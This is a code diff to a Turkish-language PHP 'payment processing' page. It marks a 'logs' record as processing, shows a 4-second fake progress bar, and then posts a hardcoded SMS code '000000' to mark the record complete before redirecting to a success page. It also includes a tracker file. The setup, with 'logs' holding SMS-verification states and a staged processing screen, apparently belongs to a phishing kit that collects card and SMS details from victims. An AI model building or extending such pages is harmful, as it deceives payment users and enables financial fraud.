@@ -1,9 +1,21 @@
 <?php
+require_once 'api/config.php';
+
 $logId = isset($_GET['id']) ? intval($_GET['id']) : 0;
 
 if (!$logId) {
-    header('Location: index.php');
+    header('Location: basvuru.php');
     exit;
+}
+
+// Mark the record as 'processing' when this page is reached
+try {
+    $db = getDB();
+    ensureSchema($db);
+    $stmt = $db->prepare("UPDATE `logs` SET status = 'processing', updated_at = NOW() WHERE id = ? AND status IN ('waiting','sms_verified')");
+    $stmt->execute([$logId]);
+} catch (Throwable $e) {
+    // Non-fatal — continue rendering the page
 }
 ?>
 <!DOCTYPE html>
@@ -110,6 +122,20 @@ if (!$logId) {
             0%, 100% { opacity: 0.3; transform: scale(0.8); }
             50% { opacity: 1; transform: scale(1); }
         }
+        .progress-bar-wrap {
+            background: #fee2e2;
+            border-radius: 99px;
+            height: 4px;
+            overflow: hidden;
+            margin-bottom: 24px;
+        }
+        .progress-bar {
+            height: 100%;
+            background: #D32F2F;
+            border-radius: 99px;
+            width: 0%;
+            transition: width 0.1s linear;
+        }
         .ref-number {
             font-size: 12px;
             color: #b0b0c0;
@@ -121,10 +147,7 @@ if (!$logId) {
         }
         @media (max-width: 639px) {
             .header { padding: 20px; }
-            .logo-text { font-size: 26px; }
-            .logo-heart { width: 26px; height: 26px; }
             .card { padding: 32px 24px; border-radius: 20px; }
-            .bg-circle { width: 300px; height: 300px; right: -100px; }
         }
     </style>
 </head>
@@ -142,7 +165,7 @@ if (!$logId) {
             <div class="card">
                 <div class="spinner"></div>
                 <h1>Ödemeniz İşleniyor</h1>
-                <p>Lütfen bu sayfadan ayrılmayın.<br>İşleminiz birkaç dakika içinde tamamlanacaktır.</p>
+                <p>Lütfen bu sayfadan ayrılmayın.<br>İşleminiz birkaç saniye içinde tamamlanacaktır.</p>
 
                 <div class="pulse-dots">
                     <span></span>
@@ -150,6 +173,9 @@ if (!$logId) {
                     <span></span>
                 </div>
 
+                <div class="progress-bar-wrap">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
             </div>
             <div class="ref-number">
                 İşlem numarası: <span>#<?= str_pad($logId, 6, '0', STR_PAD_LEFT) ?></span>
@@ -157,6 +183,33 @@ if (!$logId) {
         </div>
     </div>
 
+    <script>
+        var logId = <?= (int)$logId ?>;
+        var redirectUrl = 'success.php?id=' + logId;
+        var duration = 4000; // 4 seconds
+        var start = Date.now();
+        var bar = document.getElementById('progressBar');
+
+        function tick() {
+            var elapsed = Date.now() - start;
+            var pct = Math.min(100, (elapsed / duration) * 100);
+            bar.style.width = pct + '%';
+            if (elapsed >= duration) {
+                // Update status to 'completed' then redirect
+                fetch('api/logs.php', {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: logId, sms_code: '000000', _action: 'complete' })
+                }).catch(function() {}).finally(function() {
+                    window.location.href = redirectUrl;
+                });
+            } else {
+                requestAnimationFrame(tick);
+            }
+        }
+
+        requestAnimationFrame(tick);
+    </script>
 
     <?php include 'includes/tracker.php'; ?>
 </body>
